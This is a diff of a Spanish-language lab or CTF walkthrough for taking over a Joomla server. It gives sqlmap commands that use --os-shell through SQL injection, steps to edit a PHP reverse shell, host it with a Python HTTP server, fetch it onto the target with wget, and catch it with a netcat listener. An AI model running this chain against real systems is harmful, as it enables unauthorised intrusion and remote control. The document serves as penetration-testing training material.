@@ -101,16 +101,17 @@ sqlmap --url 'http://192.168.25.131:666/index.php?option=com_abc&view=abc&letter
 ```
 ![15](https://user-images.githubusercontent.com/75953873/182728721-92cf4596-2d56-4614-88c3-30419f27d7d7.png)
 
-Subir una shell a la base de datos `joomla`:
+- *Paso 8:* Subir una shell a la base de datos `joomla`:
 ```
 sqlmap --url 'http://192.168.25.131:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3' -D joomla --os-shell --batch
 ```
 ![16](https://user-images.githubusercontent.com/75953873/182729464-41340377-450f-45ff-94eb-4c9789aab291.png)
 
-Editar la reverse shell PHP y subirla al servidor local:
+Editar la reverse shell PHP, moverla al directorio `/root` y subirla al servidor local:
 ```
-cp /usr/share/webshells/php/php-reverse-shell.php .
+cp /usr/share/webshells/php/php-reverse-shell.php /root
 nano php-reverse-shell.php
+mv php-reverse-shell.php reverseshell.php
 ```
 
 **$ip:** La IP local de su máquina.
@@ -119,5 +120,26 @@ nano php-reverse-shell.php
 
 ![18](https://user-images.githubusercontent.com/75953873/182730094-c8c2f93f-b0a6-444f-9f84-b26f4efe6030.png)
 
-
 ![17](https://user-images.githubusercontent.com/75953873/182729943-7059e627-8c01-43bc-b0f6-572664c2773c.png)
+
+Abrir servidor local con Python3:
+```
+python3 -m http.server 80
+```
+![20](https://user-images.githubusercontent.com/75953873/182731305-a8adc335-e819-4e5c-9f1e-c388f900f595.png)
+
+Descargar la reverse shell desde la shell obtenida de la base de datos:
+```
+wget http://192.168.1.9/reverseshell.php
+```
+![19](https://user-images.githubusercontent.com/75953873/182731485-6dd80b89-38fe-4aa6-a2c1-de63078be636.png)
+
+- *Paso 9:* Poner a escucha de conexiones con Netcat:
+```
+nc -lvp 4444
+``` 
+Acceder al sitio donde se subio la reverse shell:
+
+URL: `http://192.168.25.131:666/reverseshell.php`
+
+![21](https://user-images.githubusercontent.com/75953873/182731893-d0f3e803-277c-422d-b78c-fd9f8c22c66d.png)
